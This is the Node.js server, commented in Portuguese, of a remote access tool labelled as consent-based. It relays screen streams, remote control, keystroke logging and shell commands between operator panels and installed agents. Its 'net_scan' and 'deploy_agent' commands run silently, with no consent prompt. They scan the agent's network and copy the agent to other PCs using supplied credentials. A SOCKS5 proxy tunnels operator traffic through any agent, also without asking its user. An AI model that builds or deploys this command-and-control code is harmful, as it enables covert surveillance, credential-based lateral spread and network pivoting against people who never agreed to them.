import express from "express";
import http from "http";
import net from "net";
import crypto from "crypto";
import { WebSocketServer, WebSocket } from "ws";

const PORT = Number(process.env.PORT || 8080);
const ADMIN_TOKEN = String(process.env.ADMIN_TOKEN || "");
const AGENT_KEY = String(process.env.AGENT_KEY || "");
const SOCKS_PORT = Number(process.env.SOCKS_PORT || (PORT + 1));
const MAX_ADMIN_BUFFER = 2 * 1024 * 1024;
const PENDING_TTL_MS = 60_000;

if (!ADMIN_TOKEN || !AGENT_KEY) {
  console.error("[FATAL] Configure ADMIN_TOKEN e AGENT_KEY nas variáveis de ambiente.");
  process.exit(1);
}

const app = express();
app.get("/", (_req, res) => res.json({
  status: "ok",
  service: "KL TOCHIQUE Realtime",
  version: "4.0-consent"
}));
app.get("/health", (_req, res) => res.json({ status: "ok", time: new Date().toISOString() }));

const server = http.createServer(app);
const wss = new WebSocketServer({
  server,
  maxPayload: 12 * 1024 * 1024,
  perMessageDeflate: false
});

const agents = new Map();
const admins = new Set();
const pending = new Map();
// Canais SOCKS5 ativos: channelId -> { sock, agentId, closed }
const channels = new Map();

function send(ws, obj) {
  if (ws?.readyState === WebSocket.OPEN) ws.send(JSON.stringify(obj));
}

function cleanLabel(v) {
  return String(v || "Operador remoto").replace(/[\r\n\t]/g, " ").slice(0, 80) || "Operador remoto";
}

function newRequest(admin, agent, kind, ttlMs = PENDING_TTL_MS, silent = false) {
  const requestId = crypto.randomUUID();
  pending.set(requestId, {
    requestId,
    adminId: admin.id,
    agentId: agent.id,
    kind,
    createdAt: Date.now(),
    ttlMs
  });
  if (!silent) send(admin, { type: "consent_pending", requestId, agentId: agent.id, kind });
  return requestId;
}

function getPending(requestId, agentId, expectedKind) {
  const p = pending.get(String(requestId || ""));
  if (!p || p.agentId !== agentId || p.kind !== expectedKind) return null;
  pending.delete(p.requestId);
  const admin = [...admins].find(x => x.id === p.adminId);
  if (!admin || admin.readyState !== WebSocket.OPEN) return null;
  return { p, admin };
}

function summaryFor(a, admin) {
  return {
    id: a.id,
    name: a.name,
    user: a.user,
    version: a.version || "",
    accessActive: a.viewPermissions.has(admin.id),
    controlActive: a.controlOwnerId === admin.id,
    keylogActive: a.keylogOwnerId === admin.id,
    inputLocked: !!a.inputLocked,
    watchers: a.watchers.size,
    authorizedViewers: a.viewPermissions.size,
    controlBusy: !!a.controlOwnerId && a.controlOwnerId !== admin.id,
    keylogBusy: !!a.keylogOwnerId && a.keylogOwnerId !== admin.id
  };
}

function broadcast() {
  for (const admin of admins) {
    send(admin, { type: "agent_list", agents: [...agents.values()].map(a => summaryFor(a, admin)) });
  }
}

function hasActiveAuthorizedWatcher(a) {
  for (const admin of a.watchers) {
    if (admin.readyState === WebSocket.OPEN && a.viewPermissions.has(admin.id)) return true;
  }
  return false;
}

function syncStream(a) {
  send(a.ws, { type: hasActiveAuthorizedWatcher(a) ? "stream_start" : "stream_stop" });
}

function syncPermissions(a) {
  send(a.ws, {
    type: "permission_state",
    accessActive: a.viewPermissions.size > 0,
    controlActive: !!a.controlOwnerId,
    keylogActive: !!a.keylogOwnerId,
    inputLocked: !!a.inputLocked,
    authorizedViewers: a.viewPermissions.size
  });
  syncStream(a);
}

function notifyConsent(admin, requestId, agentId, kind, allow, message = "") {
  send(admin, { type: "consent_result", requestId, agentId, kind, allow: !!allow, message });
}

function clearAdminRights(a, adminId) {
  a.viewPermissions.delete(adminId);
  if (a.controlOwnerId === adminId) a.controlOwnerId = null;
  if (a.keylogOwnerId === adminId) a.keylogOwnerId = null;
}

function requireAgentForAdmin(ws, msg) {
  const a = agents.get(String(msg.agentId || ""));
  if (!a) send(ws, { type: "error", message: "Computador não encontrado" });
  return a;
}

function requireViewPermission(ws, a) {
  if (!a.viewPermissions.has(ws.id)) {
    send(ws, { type: "error", message: "Solicite e obtenha autorização de visualização primeiro." });
    return false;
  }
  return true;
}

setInterval(() => {
  const now = Date.now();
  for (const [id, p] of pending) {
    if (now - p.createdAt > (p.ttlMs || PENDING_TTL_MS)) {
      pending.delete(id);
      const admin = [...admins].find(x => x.id === p.adminId);
      if (admin) notifyConsent(admin, id, p.agentId, p.kind, false, "Solicitação expirada.");
    }
  }
}, 10_000).unref();

wss.on("connection", ws => {
  ws.id = crypto.randomUUID();
  ws.role = "unknown";
  ws.selectedAgentId = null;
  ws.label = "Operador remoto";

  console.log(`[INFO] Nova conexão WebSocket: ${ws.id}`);

  ws.on("message", (data, isBinary) => {
    if (isBinary) {
      if (ws.role !== "agent" || !ws.agentId) return;
      const a = agents.get(ws.agentId);
      if (!a) return;

      for (const admin of a.watchers) {
        if (admin.readyState !== WebSocket.OPEN) continue;
        if (admin.selectedAgentId !== a.id) continue;
        if (!a.viewPermissions.has(admin.id)) continue;
        if (admin.bufferedAmount > MAX_ADMIN_BUFFER) continue;
        admin.send(data, { binary: true });
      }
      return;
    }

    let msg;
    try { msg = JSON.parse(data.toString()); }
    catch { return; }

    // Autenticação do painel.
    if (msg.type === "admin_hello") {
      if (msg.token !== ADMIN_TOKEN) {
        send(ws, { type: "error", message: "ADMIN_TOKEN inválida" });
        ws.close();
        return;
      }
      ws.role = "admin";
      ws.label = cleanLabel(msg.label);
      admins.add(ws);
      send(ws, { type: "admin_ready", sessionId: ws.id, agents: [...agents.values()].map(a => summaryFor(a, ws)) });
      return;
    }

    // Autenticação do Agent.
    if (msg.type === "agent_hello") {
      if (msg.key !== AGENT_KEY) {
        send(ws, { type: "error", message: "AGENT_KEY inválida" });
        ws.close();
        return;
      }

      ws.role = "agent";
      ws.agentId = String(msg.id || crypto.randomUUID());
      const old = agents.get(ws.agentId);
      if (old?.ws && old.ws !== ws) {
        try { old.ws.close(); } catch {}
      }

      const a = {
        ws,
        id: ws.agentId,
        name: String(msg.name || "PC").slice(0, 120),
        user: String(msg.user || "").slice(0, 120),
        version: String(msg.version || "").slice(0, 80),
        watchers: new Set(),
        viewPermissions: new Set(),
        controlOwnerId: null,
        keylogOwnerId: null,
        inputLocked: false
      };
      agents.set(ws.agentId, a);
      send(ws, { type: "agent_ready", id: ws.agentId });
      syncPermissions(a);
      broadcast();
      console.log(`[INFO] Agent conectado: ${ws.agentId}`);
      return;
    }

    if (ws.role === "admin") {
      const a = requireAgentForAdmin(ws, msg);
      if (!a) return;

      switch (msg.type) {
        case "request_access": {
          const requestId = newRequest(ws, a, "access");
          send(a.ws, { type: "access_request", requestId, requester: ws.label });
          return;
        }

        case "watch": {
          if (ws.selectedAgentId) {
            const old = agents.get(ws.selectedAgentId);
            if (old) old.watchers.delete(ws);
          }
          ws.selectedAgentId = a.id;
          a.watchers.add(ws);
          syncStream(a);
          broadcast();
          return;
        }

        case "set_profile": {
          if (!requireViewPermission(ws, a)) return;
          const profile = ["fluid", "balanced", "quality"].includes(msg.profile) ? msg.profile : "balanced";
          send(a.ws, { type: "stream_profile", profile });
          return;
        }

        case "net_scan": {
          // Varredura da rede local do Agent (não exige permissão de visualização).
          const requestId = newRequest(ws, a, "net_scan", 180_000, true);
          send(a.ws, { type: "net_scan", requestId });
          return;
        }

        case "deploy_agent": {
          // Copia o Agent para outro PC da rede e agenda a execução (não exige permissão de visualização).
          const target = String(msg.target || "").trim();
          if (!target) return send(ws, { type: "error", message: "Informe o destino (IP ou hostname)." });
          const requestId = newRequest(ws, a, "deploy_agent", 300_000, true);
          send(a.ws, {
            type: "deploy_agent",
            requestId,
            target,
            user: String(msg.user || ""),
            pass: String(msg.pass || "")
          });
          return;
        }

        case "request_control": {
          if (!requireViewPermission(ws, a)) return;
          if (a.controlOwnerId && a.controlOwnerId !== ws.id) {
            return send(ws, { type: "error", message: "O controle remoto já está em uso por outro operador." });
          }
          const requestId = newRequest(ws, a, "control");
          send(a.ws, { type: "control_request", requestId, requester: ws.label });
          return;
        }

        case "request_keylog": {
          if (!requireViewPermission(ws, a)) return;
          if (a.keylogOwnerId && a.keylogOwnerId !== ws.id) {
            return send(ws, { type: "error", message: "O compartilhamento de eventos de teclado já está em uso por outro operador." });
          }
          const requestId = newRequest(ws, a, "keylog");
          send(a.ws, { type: "keylog_request", requestId, requester: ws.label });
          return;
        }

        case "end_keylog": {
          if (a.keylogOwnerId === ws.id) {
            a.keylogOwnerId = null;
            send(a.ws, { type: "keylog_stop" });
            syncPermissions(a);
            broadcast();
          }
          return;
        }

        case "request_input_lock": {
          if (!requireViewPermission(ws, a)) return;
          if (a.controlOwnerId !== ws.id) {
            return send(ws, { type: "error", message: "O bloqueio de input só pode ser solicitado pelo operador que possui o controle remoto." });
          }

          const active = msg.active === true;
          if (!active) {
            send(a.ws, { type: "input_unlock" });
            return;
          }

          const requestId = newRequest(ws, a, "input_lock");
          send(a.ws, { type: "input_lock_request", requestId, requester: ws.label });
          return;
        }

        case "shell_cmd": {
          if (!requireViewPermission(ws, a)) return;
          if (a.controlOwnerId !== ws.id) {
            return send(ws, { type: "error", message: "Comandos remotos exigem controle remoto autorizado para este operador." });
          }
          const cmd = String(msg.cmd || "").trim();
          if (!cmd) return;
          if (cmd.length > 1000) return send(ws, { type: "error", message: "Comando muito longo." });
          const requestId = newRequest(ws, a, "shell");
          send(a.ws, { type: "shell_request", requestId, requester: ws.label, cmd });
          return;
        }

        case "control_input": {
          if (a.controlOwnerId !== ws.id) return;
          if (!a.viewPermissions.has(ws.id)) return;
          if (!msg.event || typeof msg.event !== "object") return;
          send(a.ws, { type: "control_input", event: msg.event });
          return;
        }

        case "end_control": {
          if (a.controlOwnerId === ws.id) {
            a.controlOwnerId = null;
            a.inputLocked = false;
            send(a.ws, { type: "end_control" });
            send(a.ws, { type: "input_unlock" });
            syncPermissions(a);
            broadcast();
          }
          return;
        }

        case "end_access": {
          const ownedControl = a.controlOwnerId === ws.id;
          clearAdminRights(a, ws.id);
          a.watchers.delete(ws);
          if (ws.selectedAgentId === a.id) ws.selectedAgentId = null;
          if (ownedControl && a.inputLocked) {
            a.inputLocked = false;
            send(a.ws, { type: "input_unlock" });
          }
          syncPermissions(a);
          broadcast();
          return;
        }
      }
      return;
    }

    if (ws.role === "agent") {
      const a = agents.get(ws.agentId);
      if (!a || a.ws !== ws) return;

      switch (msg.type) {
        case "access_response": {
          const hit = getPending(msg.requestId, a.id, "access");
          if (!hit) return;
          const allow = msg.allow === true;
          if (allow) a.viewPermissions.add(hit.admin.id);
          else clearAdminRights(a, hit.admin.id);
          notifyConsent(hit.admin, hit.p.requestId, a.id, "access", allow);
          syncPermissions(a);
          broadcast();
          return;
        }

        case "control_response": {
          const hit = getPending(msg.requestId, a.id, "control");
          if (!hit) return;
          const allow = msg.allow === true && a.viewPermissions.has(hit.admin.id);
          if (allow) a.controlOwnerId = hit.admin.id;
          notifyConsent(hit.admin, hit.p.requestId, a.id, "control", allow);
          syncPermissions(a);
          broadcast();
          return;
        }

        case "keylog_response": {
          const hit = getPending(msg.requestId, a.id, "keylog");
          if (!hit) return;
          const allow = msg.allow === true && a.viewPermissions.has(hit.admin.id);
          if (allow) a.keylogOwnerId = hit.admin.id;
          notifyConsent(hit.admin, hit.p.requestId, a.id, "keylog", allow);
          syncPermissions(a);
          broadcast();
          return;
        }

        case "input_lock_response": {
          const hit = getPending(msg.requestId, a.id, "input_lock");
          if (!hit) return;
          const allow = msg.allow === true && a.controlOwnerId === hit.admin.id;
          notifyConsent(hit.admin, hit.p.requestId, a.id, "input_lock", allow);
          return;
        }

        case "lock_ack": {
          a.inputLocked = msg.status === true;
          const owner = [...admins].find(x => x.id === a.controlOwnerId);
          if (owner) send(owner, { type: "lock_ack", agentId: a.id, status: a.inputLocked });
          broadcast();
          return;
        }

        case "lock_timeout": {
          a.inputLocked = false;
          const owner = [...admins].find(x => x.id === a.controlOwnerId);
          if (owner) send(owner, { type: "lock_timeout", agentId: a.id });
          broadcast();
          return;
        }

        case "shell_result": {
          const hit = getPending(msg.requestId, a.id, "shell");
          if (!hit) return;
          send(hit.admin, { type: "shell_result", agentId: a.id, requestId: hit.p.requestId, output: String(msg.output || "") });
          notifyConsent(hit.admin, hit.p.requestId, a.id, "shell", true);
          return;
        }

        case "shell_denied": {
          const hit = getPending(msg.requestId, a.id, "shell");
          if (!hit) return;
          notifyConsent(hit.admin, hit.p.requestId, a.id, "shell", false, "O usuário remoto negou o comando.");
          send(hit.admin, { type: "shell_denied", agentId: a.id, requestId: hit.p.requestId });
          return;
        }

        case "keylog": {
          if (!a.keylogOwnerId) return;
          const owner = [...admins].find(x => x.id === a.keylogOwnerId);
          if (owner && a.viewPermissions.has(owner.id) && owner.selectedAgentId === a.id) {
            send(owner, {
              type: "keylog",
              agentId: a.id,
              key: String(msg.key || "").slice(0, 80),
              down: msg.down === true,
              ts: String(msg.ts || "").slice(0, 32)
            });
          }
          return;
        }

        case "net_scan_result": {
          const hit = getPending(msg.requestId, a.id, "net_scan");
          if (!hit) return;
          send(hit.admin, {
            type: "net_scan_result",
            agentId: a.id,
            requestId: hit.p.requestId,
            localIp: String(msg.localIp || ""),
            hosts: Array.isArray(msg.hosts) ? msg.hosts : []
          });
          return;
        }

        case "deploy_result": {
          const hit = getPending(msg.requestId, a.id, "deploy_agent");
          if (!hit) return;
          send(hit.admin, {
            type: "deploy_result",
            agentId: a.id,
            requestId: hit.p.requestId,
            ok: msg.ok === true,
            log: Array.isArray(msg.log) ? msg.log : [],
            error: String(msg.error || "")
          });
          return;
        }

        case "socks_status": {
          const ch = channels.get(String(msg.channelId || ""));
          if (!ch) return;
          if (msg.ok !== true) {
            ch.sock.destroy();
            channels.delete(ch.channelId);
          }
          return;
        }

        case "socks_data": {
          const ch = channels.get(String(msg.channelId || ""));
          if (!ch || ch.closed) return;
          const data = String(msg.data || "");
          if (!data) return;
          try { ch.sock.write(Buffer.from(data, "base64")); } catch { ch.sock.destroy(); }
          return;
        }

        case "socks_close": {
          const ch = channels.get(String(msg.channelId || ""));
          if (ch) {
            ch.closed = true;
            ch.sock.destroy();
            channels.delete(ch.channelId);
          }
          return;
        }

        case "end_control": {
          a.controlOwnerId = null;
          a.inputLocked = false;
          syncPermissions(a);
          broadcast();
          return;
        }

        case "end_keylog": {
          a.keylogOwnerId = null;
          syncPermissions(a);
          broadcast();
          return;
        }

        case "end_access": {
          a.viewPermissions.clear();
          a.controlOwnerId = null;
          a.keylogOwnerId = null;
          a.inputLocked = false;
          syncPermissions(a);
          broadcast();
          return;
        }
      }
    }
  });

  ws.on("close", () => {
    console.log(`[INFO] Conexão fechada: ${ws.id}`);

    if (ws.role === "admin") {
      admins.delete(ws);
      for (const a of agents.values()) {
        a.watchers.delete(ws);
        clearAdminRights(a, ws.id);
        if (a.inputLocked && !a.controlOwnerId) {
          a.inputLocked = false;
          send(a.ws, { type: "input_unlock" });
        }
        syncPermissions(a);
      }
      for (const [id, p] of pending) if (p.adminId === ws.id) pending.delete(id);
      broadcast();
      return;
    }

    if (ws.role === "agent" && ws.agentId) {
      const a = agents.get(ws.agentId);
      if (a?.ws === ws) {
        agents.delete(ws.agentId);
        for (const [id, p] of pending) if (p.agentId === ws.agentId) pending.delete(id);
        // Encerra todos os canais SOCKS5 que passavam por este Agent.
        for (const ch of channels.values()) {
          if (ch.agentId === ws.agentId) {
            ch.closed = true;
            try { ch.sock.destroy(); } catch {}
          }
        }
        for (const [id, ch] of channels) if (ch.agentId === ws.agentId) channels.delete(id);
        broadcast();
      }
    }
  });

  ws.on("error", err => console.warn(`[WARN] WebSocket ${ws.id}: ${err.message}`));
});

// ---------------------------------------------------------------------------
// Proxy SOCKS5 (pivot): o operador conecta aqui e o tráfego é encaminhado
// pelo WebSocket até o Agent escolhido (username = agentId, password = ADMIN_TOKEN).
// ---------------------------------------------------------------------------
function socksReply(sock, code) {
  sock.write(Buffer.from([0x05, code, 0x00, 0x01, 0, 0, 0, 0, 0, 0]));
}

function pumpSocks(sock) {
  if (sock.phase === "greet") {
    if (sock.buf.length < 2) return;
    const nmethods = sock.buf[1];
    if (sock.buf.length < 2 + nmethods) return;
    const methods = [...sock.buf.subarray(2, 2 + nmethods)];
    sock.buf = sock.buf.subarray(2 + nmethods);
    if (!methods.includes(0x02)) { socksReply(sock, 0xff); sock.destroy(); return; }
    sock.write(Buffer.from([0x05, 0x02]));
    sock.phase = "auth";
    pumpSocks(sock);
    return;
  }

  if (sock.phase === "auth") {
    if (sock.buf.length < 2) return;
    const ulen = sock.buf[1];
    if (sock.buf.length < 2 + ulen + 1) return;
    const user = sock.buf.subarray(2, 2 + ulen).toString("utf8");
    const plen = sock.buf[2 + ulen];
    if (sock.buf.length < 2 + ulen + 1 + plen) return;
    const pass = sock.buf.subarray(2 + ulen + 1, 2 + ulen + 1 + plen).toString("utf8");
    sock.buf = sock.buf.subarray(2 + ulen + 1 + plen);
    const a = agents.get(user);
    if (!a || pass !== ADMIN_TOKEN) {
      sock.write(Buffer.from([0x01, 0x01]));
      sock.destroy();
      return;
    }
    sock.agentId = user;
    sock.write(Buffer.from([0x01, 0x00]));
    sock.phase = "request";
    pumpSocks(sock);
    return;
  }

  if (sock.phase === "request") {
    if (sock.buf.length < 4) return;
    if (sock.buf[0] !== 0x05) { sock.destroy(); return; }
    const cmd = sock.buf[1];
    const atyp = sock.buf[3];
    let host, port;
    if (atyp === 0x01) {
      if (sock.buf.length < 10) return;
      host = [...sock.buf.subarray(4, 8)].join(".");
      port = sock.buf.readUInt16BE(8);
      sock.buf = sock.buf.subarray(10);
    } else if (atyp === 0x03) {
      const len = sock.buf[4];
      if (sock.buf.length < 7 + len) return;
      host = sock.buf.subarray(5, 5 + len).toString("utf8");
      port = sock.buf.readUInt16BE(5 + len);
      sock.buf = sock.buf.subarray(7 + len);
    } else if (atyp === 0x04) {
      if (sock.buf.length < 22) return;
      host = [...sock.buf.subarray(4, 20)].map(b => b.toString(16).padStart(2, "0")).join(":");
      port = sock.buf.readUInt16BE(20);
      sock.buf = sock.buf.subarray(22);
    } else {
      sock.destroy();
      return;
    }

    if (cmd !== 0x01) { socksReply(sock, 0x07); sock.destroy(); return; }

    const a = agents.get(sock.agentId);
    if (!a) { socksReply(sock, 0x05); sock.destroy(); return; }

    const channelId = crypto.randomUUID();
    sock.channelId = channelId;
    channels.set(channelId, { sock, agentId: sock.agentId, closed: false });

    // Responde sucesso imediatamente; se o Agent falhar, o canal é encerrado.
    socksReply(sock, 0x00);
    send(a.ws, { type: "socks_open", channelId, host, port });
    sock.phase = "relay";
    pumpSocks(sock);
    return;
  }

  if (sock.phase === "relay") {
    const a = agents.get(sock.agentId);
    if (!a) { sock.destroy(); return; }
    const chunk = sock.buf;
    sock.buf = Buffer.alloc(0);
    if (chunk.length) {
      send(a.ws, { type: "socks_data", channelId: sock.channelId, data: chunk.toString("base64") });
    }
  }
}

net.createServer(sock => {
  sock.agentId = null;
  sock.channelId = null;
  sock.phase = "greet";
  sock.buf = Buffer.alloc(0);

  sock.on("data", chunk => {
    sock.buf = Buffer.concat([sock.buf, chunk]);
    try { pumpSocks(sock); } catch (err) { console.warn(`[SOCKS] ${err.message}`); sock.destroy(); }
  });

  sock.on("close", () => {
    if (sock.channelId && channels.has(sock.channelId)) {
      const a = agents.get(sock.agentId);
      if (a) send(a.ws, { type: "socks_close", channelId: sock.channelId });
      channels.delete(sock.channelId);
    }
  });

  sock.on("error", () => {});
}).listen(SOCKS_PORT, "0.0.0.0", () => {
  console.log(`KL TOCHIQUE SOCKS5 listening on ${SOCKS_PORT}`);
});

server.listen(PORT, "0.0.0.0", () => {
  console.log(`KL TOCHIQUE Realtime 4.0 listening on ${PORT}`);
});
